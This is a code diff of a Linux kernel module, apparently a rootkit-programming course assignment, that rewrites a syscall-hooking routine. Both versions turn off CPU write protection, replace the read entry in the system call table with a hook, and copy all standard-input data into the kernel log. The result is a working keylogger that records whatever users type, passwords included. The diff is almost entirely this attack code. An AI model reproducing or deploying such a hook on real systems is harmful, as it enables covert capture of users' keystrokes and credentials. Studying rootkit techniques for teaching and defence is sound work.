@@ -18,84 +18,65 @@
 #include <asm/processor-flags.h>
 #include <linux/string.h>
 #include <linux/slab.h>
-#include <linux/kref.h>
 
 #define DRIVER_AUTHOR "Rootkit Programming"
 #define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"
 
-
-// cast sys_call_table
-unsigned long *sys_call_table = (unsigned long *) sys_call_table_R;
-
-// cast pages function
-void (*pages_rw)(struct page *page, int numpages) =  (void *) set_pages_rw_T;
-void (*pages_ro)(struct page *page, int numpages) =  (void *) set_pages_ro_T;
-
-struct page * sys_call_pages_temp;
-
-struct kref *ref;
-
+void ** syscall_table = (void * *) sys_call_table_R;
+ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
 char * buffer;
-int  used=0;
+int r_count=0;
 
-long (*original_read)(unsigned int, char __user *, size_t);
-static long my_read(unsigned int fd, char __user *buf, size_t count){
-  used++;
-  long t =(*original_read)(fd,buf,count);
-  if(fd == 0){//stdin
-    printk(KERN_INFO "begin\n");
-    if(count >= 0){
-      kfree(buffer);
-      buffer = (char *) kmalloc(count+1, GFP_KERNEL);
-    }
-    if(buffer != NULL){
-      strncpy(buffer, (char*)buf, count);
-      buffer[count]='\0';
-      printk(KERN_INFO "%s\n", buffer);
-    }
-    printk(KERN_INFO "fertig\n");
-  }
-  used --;
-  return t;
+inline void disable_wp(void){
+	write_cr0(read_cr0() & ~0x00010000);
 }
 
-static void print_nr_procs()
-{
-  // cast system symbol adress to function pointer
-  int a = ((int (*)(void))nr_processes_T)();
-  printk(KERN_INFO "Number of current running processes (cast system symbol adress to function pointer): %d\n", a);
+inline void enable_wp(void){
+	write_cr0(read_cr0() | 0x00010000);
 }
+
+static ssize_t my_read(int fd, void *buf, size_t count){
+	static int buf_size = 0;
+	ssize_t retVal;
+	r_count++;
+	retVal = orig_sys_read(fd, buf, count);
+	if(fd == 0){ //stdin
+		if(count >= buf_size){
+			kfree(buffer);
+			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
+		}
+		if(buffer != NULL){
+			strncpy(buffer, (char*)buf, count);
+			buffer[count]='\0';
+			printk(KERN_INFO "%s\n",buffer);
+		}
+	}
+	r_count--;
+	return retVal;
+}
+
 
 static int __init mod_init(void)
 {
-  printk(KERN_INFO "Welcome!\n");
-  print_nr_procs();
+  disable_wp(); 
 
-  write_cr0 (read_cr0() & (~ X86_CR0_WP));
-  sys_call_pages_temp = virt_to_page(&sys_call_table);
-  pages_rw(sys_call_pages_temp,1);
-  printk(KERN_INFO "change to read write\n");
-
-  original_read = (void *) sys_call_table[__NR_read];
-  sys_call_table[__NR_read] = (long) my_read;
-  write_cr0 (read_cr0() | X86_CR0_WP);
-  printk(KERN_INFO "Welcome end!\n");
-  //kref_init(ref);
+  orig_sys_read = syscall_table[__NR_read];
+  syscall_table[__NR_read] = my_read;
+ 
+  enable_wp();
+  
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
+  disable_wp();
+  syscall_table[__NR_read] = orig_sys_read;
+  enable_wp();
   kfree(buffer);
-  write_cr0 (read_cr0() & (~ X86_CR0_WP));
-//  sys_call_pages_temp = virt_to_page(sys_call_table);
- // pages_ro(sys_call_pages_temp,1);
-  while(used>0){
-    printk(KERN_INFO "used");
-  }
-  sys_call_table[__NR_read] = (long) original_read;
-  write_cr0 (read_cr0() | X86_CR0_WP);
-  printk(KERN_INFO "Bye!");
+  while(r_count > 0){
+	printk(KERN_INFO "\n");
+  }  
 }
 
 
